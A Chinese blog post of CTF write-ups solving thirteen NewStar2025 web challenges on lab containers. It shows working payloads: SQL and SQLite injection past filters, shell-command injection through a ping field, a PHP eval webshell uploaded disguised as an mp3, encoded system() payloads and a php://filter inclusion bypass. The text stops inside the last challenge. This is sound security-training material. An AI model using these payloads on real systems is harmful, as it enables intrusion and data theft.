---

title: NewStar2025-WP
date: 2026-07-21
categories: ["CTF-Writeups","青岑CTF-WP集"]
permalink: /ctf-writeups-ctf-wp/newstar2025-wp
---


# 1.别笑，你也过不了第二关
#### 摘要：
要有一定的代码审计能力，了解游戏的逻辑，游戏要求每关需要达到目标分数才能过关。  **目标分数数组**是 `[30, 1000000]`，第一关 30 分，第二关 **100 万分**。正常玩几乎不可能达到，但是代码中会将最终分数通过 `POST` 请求发给`/flag.php`。  因此我们需要**伪造或篡改分数**，让游戏以为达成了 100 万分。
#### 相关代码审计：
既然是对分数有要求，那么我们直接在源代码里面搜索score相关的内容。
```javascript
if (score >= targetScores[currentLevel]) {
}
```
而前面说了，
```
let targetScores = [30, 1000000]; // 每关目标分数
```
所以第二关要分数达到1000000才能通关，所以思路可以是使用控制台来直接修改分数，让自己的score=1000000，不过经过测试好像不行，应该后端有校验之类的。我们继续往下看代码，发现
```java
fetch("/flag.php", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: formData.toString() }) .then(res => res.text()) .then(data => { alert("服务器返回:\n" + data); })
```
意思是说：向/flag.php发送POST请求，score=目标分数时服务器返回一串数据。这里需要有一定的js基础
```java
fetch("/flag.php", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "score=1000000" }).then(res => res.text()).then(alert);
```
或者访问/flag.php并且POST传入score=1000000也行。
在控制台输入这个代码就能拿到flag！！！
#  2.宇宙的中心是 PHP
#### 摘要：
主要考察php的弱类型 + 进制转换绕过，不过前提是找到php源码
#### 解：
其实刚点进来也是一头雾水，不过我们可以按照做web题的一般步骤来（我的一般步骤），先查看网页源码，按f12、ctrl+u和右击都没有用，所以网页源码肯定有猫腻，聪明的小伙伴肯定就知道了，我们可以直接通过浏览器的设置打开
web开发者工具（或者在url栏最前面加上view-source:也可以）
![](/images/20260507123857.png)
然后我们访问/s3kret.php，就能看到php的源码了。
```php
<?php   
highlight_file(__FILE__);   
include "flag.php";   
if(isset($_POST['newstar2025'])){    $answer = $_POST['newstar2025'];       if(intval($answer)!=47&&intval($answer,0)==47){           echo $flag;      
			 }else{          
				  echo "你还未参透奥秘";    
   } 
 }
```
#### 代码审计：
```php
if(intval($answer) != 47 && intval($answer, 0) == 47){
        // intval($answer)          → 十进制转换
        // intval($answer, 0)       → 根据参数格式自动判断进制
        //                 ^ 0 表示自动检测（0x开头16进制，0开头8进制，否则10进制）
        echo $flag;
    //intval($answer) != 47 按十进制转换后不等于47
    //intval($answer, 0) == 47 按自动识别进制转换后等于47
    需要同时满足这两个条件
```
**利用方法**：
- `intval($answer)` → 十进制转换，不考虑进制前缀
- `intval($answer, 0)` → 自动识别进制（0x=十六进制，0开头=八进制）
**绕过原理**：  
利用两种转换方式的差异，输入一个数值：
- 按十进制转换 **不等于** 47
- 按自动进制转换 **等于** 47
**有效 Payload**：
- `newstar2025=0x2F`（十六进制，十进制=47）
- `newstar2025=057`（八进制，十进制=47）
均可以拿到flag！！！
# 3.multi-headach3
#### 摘要：
了解什么是robots.txt是什么，以及302重定向怎么解决
#### 解：```
通过页面的内容，我们可以大概知道解题思路
```
ROBOTS is protecting this website!
```
我们可以查看robots.txt（**robots.txt** 是一个放在网站根目录的文本文件，它的核心作用是向网络爬虫（比如谷歌、百度的搜索机器人）告知网站哪些内容可以抓取，哪些不允许），然后返回了
```http
User-agent: *
Disallow: /hidden.php
```
接着我们就访问/hidden.php，页面回显
```bash
# 你好!

今天是xxxx/xx/xx

欢迎访问我的第一个网站!  
  
机器人 正在保护这个网站!  
但......为什么我的头这么厉害 疼痛???!!!  
你为什么一次又一次地来到这里?  
相信我,隐藏页面并不像你想象的那么简单。
```
结果确实是一次又一次的回到这里，这时我们留意隐藏的页面是什么？？
我们可以打开web开发者工具，在网络这一栏里面发现/hidden.php是302，被重定向了，我们只能看到“最终结果”，这时我们可以打开bp来抓/hidden.php的数据包
![](/images/20260507145941.png)
就能看到flag！！！
#### 注：浏览器开发者工具与Burp Suite对302重定向的区别

| 特性         | 浏览器开发者工具 (Network面板) | Burp Suite (Proxy/History) |
| ---------- | -------------------- | -------------------------- |
| **处理逻辑**   | 自动跟随重定向，展示最终结果       | 拦截原始数据包，不自动跟随              |
| **302响应体** | **不显示**，或被跳过         | **完整显示**                   |
# 4.strange_login
#### 摘要：
万能密码绕过
#### 解：
其实题目提醒的很明白了，我觉得没必要过多叙述
```
用户名：随便取' or 1=1  #
密码：喜欢什么填什么
```
# 5.黑客小 W 的故事（1）
#### 摘要：
根据提示抓包，改点击次数，然后get传参能和蘑菇先生正常交流，理解DELETE这种请求方式，和User-Agent
#### 解：
##### 1.第一关：骨钉大师——奥罗的考验
先给骨钉大师打一点吉欧，直接连点是没用的，查看提示需要抓包，直接抓包
![](/images/20260507201551.png)
很明显，需要修改count的参数，为了确保能达到一定数量的吉欧，我们直接改成500，然后我们就得到了下一关的地址![](/images/20260507201741.png)
#####  2.第二关：骨钉大师——马托的考验
骨钉大师要我们和蘑菇先生拿回骨钉，直接提guding
接着就和蘑菇先生对话，不过蘑菇先生说的话叽里咕噜的，直接查看提示
```
听说需要在 get 参数的 shipin 里传入 “蘑菇孢子(mogubaozi)”？
```
直接传参
```
http://docker.qingcen.net:47787/talkToMushroom?shipin=mogubaozi
```
接着和蘑菇先生对话，他就能正常交流了
```
你想对我说什么呢？用 POST 的方法告诉我吧
```
结合骨钉大师的要求，直接POST传一个guding给蘑菇先生
```
POST:shipin=guding
```
然后蘑菇先生告诉我们：这样吧，你用 DELETE 的方法把我身上的虫子(chongzi)都弄掉，我就把骨钉给你（这里需要了解DELETE是什么，其实它和POST，GET等一样也是一种请求方式），直接抓包来完成蘑菇先生的要求
![](/images/20260507203307.png)
放行后，再找蘑菇先生，他就会给出进入下一关的路径：/Level2_END
##### 3. 第三关：骨钉大师—— 席奥的考验
席奥问：你的旋风斩(CycloneSlash)呢？使出来吧！
还是可以查看提示：（或许只有 User-Agent 了，试试吧！
```
User-Agent:CycloneSlash
```
不过他说：光说不干假把式，从哪学来的盗版货？！是不是很奇怪，不过HackBar v2这个插件给了我们一点小提示，就是版本问题，再后面加上/5.0就行了，然后席奥问了：你的冲锋斩(DashSlash)呢？使出来吧！
和上面一样
```
User-Agent:CycloneSlash/5.0,DashSlash/5.0
```
然后我们就得到了进入下一关的路径/Level4_Sly，拿到flag！！！
# 6.我真得控制你了
#### 摘要：
首先要绕过开头的限制，个人觉得view-source:是看页面源码的**万能钥匙**
绕过限制过后就是一个弱口令的爆破，最后是一个复杂的rce，综合对代码审计有一定的要求。
#### 解：
看到这里的启动是用不了的，很显然是要解禁这个启动按钮。不过，ctrl+u、F12、Ctrl+Shift+I、Ctrl+Shift+J都用不了，而且web开发者工具也被禁用了，不过好在view-source:还是可以使用的，我们可以查看网页源码。
#### 代码审计：
先找一下form表单
```java
<form id="nextLevelForm" method="POST" action="[next-level.php](view-source:http://docker.qingcen.net:47817/next-level.php)"> <input type="hidden" name="access" value="1"> <input type="hidden" name="csrf_token" value="c8dad6eee5440d680d359a41dc1a56b8c951c143fe81a832eec56f79d116a965"> </form>
```
其实这个是一个**隐藏的POST表单**，用于向服务器提交数据。
```http
<input type="hidden" name="access" value="1">
```
**`type="hidden"`**：隐藏字段，页面上不可见，但提交时会一同发送
这里给了一个
```http
http://docker.qingcen.net:47817/next-level.php
```
而且需要POST传入
```http
POST: access=1&csrf_token=c8dad6eee5440d680d359a41dc1a56b8c951c143fe81a832eec56f79d116a965
```
接下来我们就进入了一个“# 太弱了，太弱了！！”的登录界面，这是个弱口令，直接爆破获得账号：admin密码：111111
然后我们就拿到了一个php代码
```php
<?php
error_reporting(0);

function generate_dynamic_flag($secret) {
    return getenv("ICQ_FLAG") ?: 'default_flag';
}


if (isset($_GET['newstar'])) {
    $input = $_GET['newstar'];
    
    if (is_array($input)) {
        die("恭喜掌握新姿势");
    }
    

    if (preg_match('/[^\d*\/~()\s]/', $input)) {
        die("老套路了，行不行啊");
    }
    

    if (preg_match('/^[\d\s]+$/', $input)) {
        die("请输入有效的表达式");
    }
    
    $test = 0;
    try {
        @eval("\$test = $input;");
    } catch (Error $e) {
        die("表达式错误");
    }
    
    if ($test == 2025) {
        $flag = generate_dynamic_flag($flag_secret);
        echo "<div class='success'>拿下flag！</div>";
        echo "<div class='flag-container'><div class='flag'>FLAG: {$flag}</div></div>";
    } else {
        echo "<div class='error'>大哥哥泥把数字算错了: $test ≠ 2025</div>";
    }
} else {
    ?>
<?php } ?>
```
#### 代码分析：
```php
if ($test == 2025) {
        $flag = generate_dynamic_flag($flag_secret);
        echo "<div class='success'>拿下flag！</div>";
        echo "<div class='flag-container'><div class='flag'>FLAG: {$flag}</div></div>";
    }//要求newstar=2025
```
过滤了
```php
 if (is_array($input)) {
        die("恭喜掌握新姿势");
    }//数组被过滤
    
if (preg_match('/[^\d*\/~()\s]/', $input)) {
        die("老套路了，行不行啊");
    }//允许的字符：0-9、*（乘）、/（除）、~（取反）、）、（、空格
    
if (preg_match('/^[\d\s]+$/', $input)) {
        die("请输入有效的表达式");
    }//不允许纯数字和空格
```
核心代码
```php
    try {
        @eval("\$test = $input;");
    } catch (Error $e) {
        die("表达式错误");
    }//eval() 将字符串当作PHP代码执行
```
所以，我们可以使用?newstar=2025 * 1或?newstar=45 * 45等
经过核心代码就相当于eval("$test = 2025 * 1;");而实际执行
$test = 2025 * 1; 这样，我们就能拿到flag！！！
# 7.真的是签到诶
#### 摘要：
真的真的要看懂代码，知道传入的数据被进行了哪些操作，最后逆着来ROT13 -> Atbash -> Base64 Encode
#### 解：
#####  代码审计：
```php
`<?php   
highlight_file(__FILE__);      $cipher = $_POST['cipher'] ?? '';      function atbash($text) {  
	$result = '';    	
	foreach (str_split($text) as $char{  
	  if (ctype_alpha($char)) {  
    $is_upper = ctype_upper($char); 
    $base = $is_upper ? ord('A') : ord('a');  
    $offset = ord(strtolower($char)) -ord('a'); 
    $new_char = chr($base + (25 - $offset));      
    $result .= $new_char;     
      } else {     
    $result .= $char;   }    
     }    
     return $result;   }     
if ($cipher) {  
     $cipher = base64_decode($cipher);  
     $encoded = atbash($cipher);  
     $encoded = str_replace(' ', '', $encoded);  
     $encoded = str_rot13($encoded);     
     @eval($encoded);     
     exit;   
     }      
     $question = "真的是签到吗？";   
     $answer = "真的很签到诶！";
           
     $res =  $question . "<br>" . $answer . "<br>";   echo $res . $res . $res . $res . $res;      ?>`
```
意思是当你 POST传入参数 `cipher`后，该代码执行了以下的过程
- 对 `cipher` 进行 `base64_decode`
- 执行 **Atbash 密码**（a↔z, b↔y...）
- 删除所有空格
- 执行 **ROT13**
- 最终 `eval()` 结果
所以我们只需要把顺序逆过来就好了，即ROT13 -> Atbash -> Base64 Encode，还有payload 里面不要出现空格即可：
先查看根目录下的文件
```php
system('ls${IFS}$9/');
flfgrz('yf${VSF}$9/');
uoutia('bu${EHU}$9/');
dW91dGlhKCdidSR7RUhVfSQ5LycpOw==
```
就能发现flag
```php
system('cat${IFS}$9/flag');
flfgrz('png${VSF}$9/synt');
uoutia('kmt${EHU}$9/hbmg');
dW91dGlhKCdrbXQke0VIVX0kOS9oYm1nJyk7
```
所以传入
```http
cipher=dW91dGlhKCdrbXQke0VIVX0kOS9oYm1nJyk7
```
就能拿到flag！！！
# 8.搞点哦润吉吃吃🍊
#### 摘要：
先尝试了SQL注入和爆破，其实账号密码就在网页源码里面，后面需要在三秒内计算token值，最好的办法就是写脚本（ai）
#### 解：
看到登录界面大致就两种思路：（1）sql注入（2）爆破账号密码
可惜了，都不是（陪笑）！！！
还是打开了页面源码看了看，果真里面是有线索的
![](/images/20260508083405.png)
原来他直接就把账号密码给我们了，于是我们就登录进来了。
Doro给了我们一些提示：
```
1. 点击"开始验证"获取验证表达式
2. 使用表达式计算token值并在3秒内提交
3. 表达式格式：`token = (int(time.time()) * multiplier) ^ xor_value`
emmm... doro觉得抓包看看也许会发现这个系统的逻辑
```
短短的3秒钟对人来说就是无法完成的，抓包的话，其实我burp用的不是很熟悉，很多参数不是很了解，但是解决这个问题的方法还是很多的
##### 法一：burp法（以后更新）
##### 法二：python脚本
```python
import requests

TARGET = "[http://docker.qingcen.net:47079](http://docker.qingcen.net:47079)"

session = requests.Session()

headers = {  
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",  
"Accept": "_/_",  
"Origin": "[http://docker.qingcen.net:47079](http://docker.qingcen.net:47079)",  
"Referer": "[http://docker.qingcen.net:47079/home](http://docker.qingcen.net:47079/home)",  
"Accept-Encoding": "gzip, deflate, br",  
"Accept-Language": "zh-CN,zh;q=0.9",  
}

# 登录，session 自动保存 cookie

login_resp = session.post(  
TARGET + "/login",  
data={"username": "Doro", "password": "Doro_nJlPVs_@123"},  
headers=headers  
)  
print(f"[+] 登录响应: {login_resp.status_code}")  
print(f"[+] 当前 cookie: {session.cookies.get_dict()}")

# 开始挑战

resp = session.post(TARGET + "/start_challenge", headers={**headers, "Content-Type": "application/json"})  
print(f"[+] 完整响应: {resp.text}")

resp_json = resp.json()  
expression = resp_json["expression"]  
print(f"[+] expression: {expression}")

local = {}  
exec(expression, {}, local)  
token = local["token"]  
print(f"[+] token = {token}")

result = session.post(TARGET + "/verify_token", json={"token": token}, headers={**headers, "Content-Type": "application/json"})  
print(f"[+] Response: {result.json()}")
```
##### 法三：js书签(最快但是原理很难)
```java
javascript:(async function(){try{const r1=await fetch("/start_challenge",{method:"POST",headers:{"Content-Type":"application/json"},credentials:"include"});const d1=await r1.json();const expr=d1.expression;const match=expr.match(/\((\d+)\s*\*\s*(\d+)\)\s*\^\s*(0x[a-fA-F0-9]+)/);if(!match)throw new Error("解析失败");const timestamp=BigInt(match[1]);const multiplier=BigInt(match[2]);const xor_value=BigInt(match[3]);const product=timestamp*multiplier;let token=product^xor_value;if(token<0||token>Number.MAX_SAFE_INTEGER){token=Number(token);}else{token=Number(token);}const r2=await fetch("/verify_token",{method:"POST",headers:{"Content-Type":"application/json"},credentials:"include",body:JSON.stringify({token:token})});const d2=await r2.json();if(d2.success){alert("✅ 成功！\n"+d2.message+(d2.flag?"\nFlag: "+d2.flag:""));}else{alert("❌ 失败！\n表达式: "+expr+"\n计算Token: "+token+"\n"+d2.message);}}catch(e){alert("错误: "+e.message);}})();
```
# 9.DD 加速器
#### 摘要：
这是一道rce的题目，要使用-la来查看隐藏的文件，然后还有长度限制，使用通配符绕过就行了！！！
##### **先了解一下 ；、&& 、|| 、&的作用(这些比较常见)**
###### 1.  ；（分号）
命令按照顺序（从左到右）被执行，并且可以用分号进行分隔。当有一条命令执行失败时，不会中断其它命令的执行。
**ping -c 1 127.0.0.1;whoami**
###### 2.  | （管理符号）
通过管理符  |  可以将一个命令的==标准输出==管理为另外一个命令的==标准输入==，当它失败后，会执行另外一条命令
**ping -c 1 127.0.0.1|whoami**
###### 3. &（后台任务符号）
命令按照顺序（从左到右）被执行，跟分号作用一样；此符号作用是后台任务符号使 shell 在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作
**ping -c 4 127.0.0.1&cat /etc/passwd&**
###### 4.&&（逻辑 “与”）
前后的命令的执行存在逻辑与关系，只有【&&】前面的命令执行成功后，它后面的命令才被执行
**ping -c 4 127.0.0.1&&whoami**
**`4` 是 `ping` 命令的 `-c` 参数的值**，表示 **发送 4 个 ICMP Echo Request（ping 请求包）**，然后停止。
具体含义：
- `-c` = count（计数）
- `4` = 发送 4 个探测包
- 收到 4 个应答后，`ping` 会自动结束并输出统计信息
###### 5.||（逻辑“或”）
前后命令的执行存在逻辑或关系，只有【||】前面的命令执行失败后，它后面的命令才被执行；
**ping -c ||whoami**
#### 解：
我们先试一下
```
127.0.0.1;ls /
```
来查看一下根目录里面有什么
```
PING 127.0.0.1 (127.0.0.1) 1400(1428) bytes of data.
1408 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.029 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.029/0.029/0.029/0.000 ms
bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```
发现了里面存在flag，直接
```
127.0.0.1;cat /flag
```
结果
```
PING 127.0.0.1 (127.0.0.1) 1400(1428) bytes of data.
1408 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.049 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.049/0.049/0.049/0.000 ms
flag{not_here!}
```
当然没那么简单啦！！！这就需要我们搜集更多的信息了，我们可以使用
```
127.0.0.1;ls -la /     
```
来查看一下有没有什么隐藏的文件（注：-la可任意查看所有文件（包括隐藏文件））
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.044 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms
total 80
drwxr-xr-x    1 root root 4096 May  8 09:47 .
drwxr-xr-x    1 root root 4096 May  8 09:47 ..
drwxr-xr-x    2 root root 4096 May  8 09:47 .c2bdretgk8utl60kfb6oxpm9m63jax3b
-rwxr-xr-x    1 root root    0 May  8 09:47 .dockerenv
drwxr-xr-x    1 root root 4096 Aug 20  2025 bin
drwxr-xr-x    2 root root 4096 Nov 22  2020 boot
drwxr-xr-x    5 root root  340 May  8 09:47 dev
drwxr-xr-x    1 root root 4096 May  8 09:47 etc
-rw-r--r--    1 root root   16 May  8 09:47 flag
drwxr-xr-x    2 root root 4096 Nov 22  2020 home
drwxr-xr-x    1 root root 4096 Dec 11  2020 lib
drwxr-xr-x    2 root root 4096 Dec  9  2020 lib64
drwxr-xr-x    2 root root 4096 Dec  9  2020 media
drwxr-xr-x    2 root root 4096 Dec  9  2020 mnt
drwxr-xr-x    2 root root 4096 Dec  9  2020 opt
dr-xr-xr-x 1292 root root    0 May  8 09:47 proc
drwx------    1 root root 4096 Dec 11  2020 root
drwxr-xr-x    1 root root 4096 Dec 11  2020 run
drwxr-xr-x    1 root root 4096 Aug 20  2025 sbin
drwxr-xr-x    2 root root 4096 Dec  9  2020 srv
dr-xr-xr-x   13 root root    0 Jan 30 15:09 sys
drwxrwxrwt    2 root root   40 May  8 09:47 tmp
drwxr-xr-x    1 root root 4096 Dec  9  2020 usr
drwxr-xr-x    1 root root 4096 Dec 11  2020 var
```
这次多了一个
```
.c2bdretgk8utl60kfb6oxpm9m63jax3b
```
这是一个隐藏文件（以 . 开头的文件/目录默认是隐藏的），所有我们可以查看一下这个文件
```
127.0.0.1;cat /.c2bdretgk8utl60kfb6oxpm9m63jax3b
```
不过告诉我们目标地址长度超过限制，所有是有长度限制的，我们可以使用通配符绕过长度限制
```
127.0.0.1; cat /.v*/f*
```
这样我们就拿到flag！！！
当然了，也可以直接查看环境变量
```
127.0.0.1;env
```
直接就能拿到flag！！！
# 10.白帽小 K 的故事（1）
#### 摘要：
文件上传，没有过滤这是最大的遗憾，后面在源码里找上传的文件的路径和文件的参数名就行了
#### 解：
要上传一个.mp3的文件，所以可以判断是个文件上传的题目，我们可以写一个带木马的1.mp3
```php
<?php
 @eval($_POST['cmd']);
 ?>
```
上传该1.mp3并抓包改成1.php
![](/images/20260508203629.png)
响应包里面显示上传成功，不过页面没有回显上传的路径（一开始我也是愣头青直接就POST传了cmd=system('cat /flag');结果一直显示错误,wuwuwu）
这里需要查看页面源码，看上传路径是不是被隐藏了
```http
try {

const res = await fetch('/v1/upload', {

method: 'POST',

body: formData

});
// TODO： // 小岸同学到时候记得把这个函数删掉 
async function fetchload(file) {
	 try {
		  const res = await fetch('/v1/onload', {
			   method: 'POST', 
			   headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, 
			   body: `file=${encodeURIComponent(file)}` });
```
这里的上传路径是/v1/upload，而且需要POST传入file=上传的文件名
所以
```
file=1.php&cmd=system('cat /flag');
```
就拿到flag！！！
# 11.小 E 的管理系统
#### 摘要：
题目描述是原始的SQL拼接——你能绕过小 E 的防火墙，其实这里考的不是传统的MYsql，而是sqlite，所以语法上和平常的SQL注入还是有区别的，并且过滤了挺多东西，Tab代空格、JOIN代逗号、LIMIT+OFFSET遍历
#### 解：
他说了有waf，所以我们可以测试一些sql注入常用的符号，关键词，最终发现空格、逗号、单双引号、注释、分号都被过滤了，并且我们也不知道查询接口地址，所以我们可以查看网页源码看能不能找到什么：
```php
fetch(`query.php?id=${encodeURIComponent(nodeId)}`) .then(response => { if (!response.ok) { if (response.status === 403) { return { error: "防火墙策略阻止访问" }; }
if (response.status === 500) { if (data.error && data.error.includes("database error")) { errorMessage = "数据库错误: " + data.error.split(": ")[1]; } }
```
由此可见，/query.php?id=是查询的接口,而且也知道了数据库是sqlite，所以后面直接在hackbar里面操作就简单很多了,经过测试我也发现了0x09、`、\、JOIN关键字是不被过滤的
```
/query.php?id=(select%09count(*)%09from%09sqlite_master)
```
确定了是sqlite数据库
```
/query.php?id=0%09UNION%09SELECT%09*%09FROM%09((SELECT%091%09a)%09JOIN%09(SELECT%09name%09b%09FROM%09sqlite_master%09LIMIT%091%09OFFSET%09[N])%09JOIN%09(SELECT%093%09c)%09JOIN%09(SELECT%094%09d)%09JOIN%09(SELECT%095%09e))
```
id=0让原查询为空，UNION接我们的数据,接下来我们查看有几个表
```
/query.php?id=(select%09count(*)%09from%09sqlite_master)
```
返回值显示有四个表，看第一个表
```
/query.php?id=0%09UNION%09SELECT%09*%09FROM%09((SELECT%091%09a)%09JOIN%09(SELECT%09name%09b%09FROM%09sqlite_master%09LIMIT%091%09OFFSET%090)%09JOIN%09(SELECT%093%09c)%09JOIN%09(SELECT%094%09d)%09JOIN%09(SELECT%095%09e))
```
第一个表node_status，查看第二个表
```
/query.php?id=0%09UNION%09SELECT%09*%09FROM%09((SELECT%091%09a)%09JOIN%09(SELECT%09name%09b%09FROM%09sqlite_master%09LIMIT%091%09OFFSET%091)%09JOIN%09(SELECT%093%09c)%09JOIN%09(SELECT%094%09d)%09JOIN%09(SELECT%095%09e))
```
第二个表sys_config，同理第三个表sqlite_autoindex_sys_config_1，第四个表sqlite_sequence
接下来就是看这四个表里面有什么（其实flag在sys_config里面，因为太麻烦了，这里就省略了，感兴趣的可以看看其他3个表）
```
/query.php?id=0%09UNION%09SELECT%09*%09FROM%09((SELECT%091%09a)%09JOIN%09(SELECT%09sql%09b%09FROM%09sqlite_master%09LIMIT%091%09OFFSET%091)%09JOIN%09(SELECT%093%09c)%09JOIN%09(SELECT%094%09d)%09JOIN%09(SELECT%095%09e))
```
返回了
```
CREATE TABLE sys_config (\n id INTEGER PRIMARY KEY AUTOINCREMENT,\n config_key VARCHAR(50) UNIQUE,\n config_value TEXT\n)
```
我们了解sys_config表的完整结构后，构造注入payload读取该表的所有数据。将id、config_key、config_value三列分别映射到JOIN子查询的第一、二、三个位置
```
/query.php?id=0%09UNION%09SELECT%09*%09FROM%09((SELECT%09id%09a%09FROM%09sys_config)%09JOIN%09(SELECT%09config_key%09b%09FROM%09sys_config)%09JOIN%09(SELECT%09config_value%09c%09FROM%09sys_config)%09JOIN%09(SELECT%094%09d)%09JOIN%09(SELECT%095%09e))
```
就能拿到flag！！！
#### 注：让ai帮我总结了考察的知识点
##### 1. SQL注入基础
- **原始SQL拼接漏洞**：参数直接拼接到SQL语句中，无参数化处理
- **联合查询注入（UNION SELECT）**：通过UNION合并结果集读取数据
##### 2. WAF绕过技巧

|过滤目标|绕过方法|原理|
|:--|:--|:--|
|空格过滤|Tab(`%09`)替代|SQL中Tab与空格同为空白分隔符|
|逗号过滤|JOIN替代|`(SELECT 1 a)JOIN(SELECT 2 b)` 等价于 `SELECT 1,2`|
|引号过滤|LIMIT+OFFSET遍历|逐行读取，避免字符串比较|
|注释过滤|无需注释|利用语法闭合或构造完整语句|

##### 3. SQLite数据库特性
- `sqlite_master` 系统表：存储数据库元信息（表名、结构）
- `sql` 列：获取建表语句（表结构）
- JOIN语法支持多子查询横向拼接
##### 4. 信息枚举流程
1. 确认数据库类型（SQLite）
2. 枚举表名（`sqlite_master.name`）
3. 获取表结构（`sqlite_master.sql`）
4. 读取目标表数据
# 12.小 E 的秘密计划
#### 摘要：
给了提示：先找到网站备份文件（dirsearch扫），发现了/www.zip->git泄露->.DS_Store 泄露
#### 解：
先使用dirsearch扫描一下目录（题目有tips），发现了/www.zip，解压后打开
```
/public-555edc76-9621-4997-86b9-01483a50293e/login.php
```
看到一个登录框，但不知道账号密码，提示说：“登录失败，在 git 里找找吧” → 让我们去 `.git` 里找（这里需要电脑里面有git环境）
在终端进入解压后的目录
```bash
cd public-555edc76-9621-4997-86b9-01483a50293e/
ls -la   # 确认有 .git 文件夹
```
查看Git提交历史
```bash
git log --oneline --all --decorate --graph
```
输出
```
* 5fef682 (HEAD -> master) 删除提示
* 5f8ecc0 新增提示
* 1389b47 初始化
```
只看到 3 条记录，但题目说有“测试分支”被删了，需要看完整历史
查看所有历史（包括已删除的）
```bash
git reflog --all
```
输出
```
5fef682 (HEAD -> master) refs/heads/master@{0}: commit: 删除提示
5f8ecc0 refs/heads/master@{1}: commit: 新增提示
353b98f HEAD@{3}: commit: 测试，这个branch会删   
1389b47 HEAD@{5}: commit (initial): 初始化
```
发现了一个提交 `353b98f`，信息是“测试，这个branch会删”，在当前 `git log` 里看不到 → 说明它被删除了，但 `reflog` 还能找到
查看这个可疑提交的内容
```bash
git show 353b98f
```
输出
```
commit 353b98f...
Author: admin
Date: ...
    测试，这个branch会删

A    user.php
```
这个提交新增了 `user.php` 文件,查看这个提交中的 user.php
```bash
git show 353b98f:user.php
```
输出
```php
<?php
function getUserData() {
    return [
        'username' => 'admin',
        'password' => 'f75cc3eb-21e0-4713-9c30-998a8edb13de'
    ];
}
```
拿到了账号、密码，接下来就可以登录系统了
```bash
curl -X POST "http://docker.qingcen.net:48973/public-555edc76-9621-4997-86b9-01483a50293e/login.php" \
  -d "username=admin&password=f75cc3eb-21e0-4713-9c30-998a8edb13de" \
  -v
```
然后就给了我们一个路径
```http
{
  "success": true,
  "message": "登录成功！正在跳转...",
  "redirectUrl": "/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/"
}
```
页面提示：“小E拿mac写的这段代码。这会泄露什么吗？”
mac的泄露八成就是`.DS_Store` 泄露了
下载`.DS_Store`文件
```bash
curl -O "http://docker.qingcen.net:48973/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store"
```
这里需要注意`.DS_Store` 是二进制文件，需要用特殊方式读取
Windows系统可以使用 PowerShell来读取
```bash
[System.IO.File]::ReadAllText("$PWD\.DS_Store", [System.Text.Encoding]::Unicode)
```
输出
```
ffffllllaaaagggg114514
```
这就是隐藏的目录/文件路径,最后访问
```bash
curl "http://docker.qingcen.net:48973/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/ffffllllaaaagggg114514"
```
拿到flag！！！
#### 常见的git命令

| 命令                                           | 作用              |
| -------------------------------------------- | --------------- |
| `git log --oneline --all --decorate --graph` | 查看简洁的提交历史（图形化）  |
| `git reflog --all`                           | 查看所有历史记录（包括被删的） |
| `git show <commit>`                          | 查看某个提交的改动       |
| `git show <commit>:<file>`                   | 查看某个历史版本中的文件内容  |
| `git branch -a`                              | 查看所有分支（包括远程）    |
| `git tag`                                    | 查看所有标签          |
| `git stash list`                             | 查看暂存列表          |
| `git fsck --lost-found`                      | 找回丢失的对象         |
| `git grep "password"`                        | 在当前版本中搜索关键字     |
| `git log -p --all \| grep -i "pass"`         | 在所有历史中搜索关键字     |
# 13.ez-chain
#### 摘要：
对过滤的关键字进行url编码，浏览器会自动解码，所以进行两次url编码，有因为输出的内容里面不能又`f`,可以使用rot13输出，最后解码就行

#### 代码审计：
```php
function filter($file) {    $waf = array('/',':','php','base64','data','zip','rar','filter','flag');       foreach ($waf as $waf_word) {           if (stripos($file, $waf_word) !== false) {               echo "waf:".$waf_word;               return false;           }       }       return true;   }
```
第一个函数：（1）定义了一个黑名单‘ / ’, ‘ : ’防止目录穿越和php伪协议，但是可以使用‘ \ ’；
（2）`php`, `base64`, `data`, `zip`, `rar`: 用于阻断危险的 PHP 伪协议和流封装器；
（3）`filter`: 阻断 `php://filter` 伪协议（4）`flag`: 直接阻断文件名中包含 "flag" 的文件
```php
function filter_output($data) {   
	 $waf = array('f');       
	 foreach ($waf as $waf_word) {           if (stripos($data, $waf_word) !== false) {               echo "waf:".$waf_word;               return false;           }       
	 }        
	while (true) {        
		$decoded = base64_decode($data, true);           if ($decoded === false || $decoded === $data) {               break;           
		}        
		$data = $decoded;       }       foreach ($waf as $waf_word) {           if (stripos($data, $waf_word) !== false) {               echo "waf:".$waf_word;               return false;           }       }       return true;  
}   
```
第二个函数:(1)对‘ f ’进行了过滤;(2)反复对 `$data` 进行 base64 解码，直到无法解码或结果不变。
#### 解：
因为有过滤，所以我们需要进行url编码绕过关键词检测，但是浏览器会对get参数自动进行一次url解码，所以这里需要进行两次url编码才行。又因为输出的时候不能包含`f`，且会自动base64解码，所以我们可以使用ROT13编码避免包含字母`f` 。我们需要读取 `/flag` 文件，但直接使用 `file=/flag` 会被拦截，我们可以使用PHP 包装器 + URL 编码，编码前的payload
```
php://filter/string.rot13/resource=/flag
```
我们可以`php` → `p%68p`（编码中间的 `h`）、`:` → `%3a`、`/` → `%2f`、`filter` → `f%69lter`（编码中间的 `i`）、`flag` → `fl%61g`（编码中间的 `a`），之前说了浏览器会对get参数自动进行一次url解码，我们可以把`%`再次编码为%25，所以最终payload为
```text
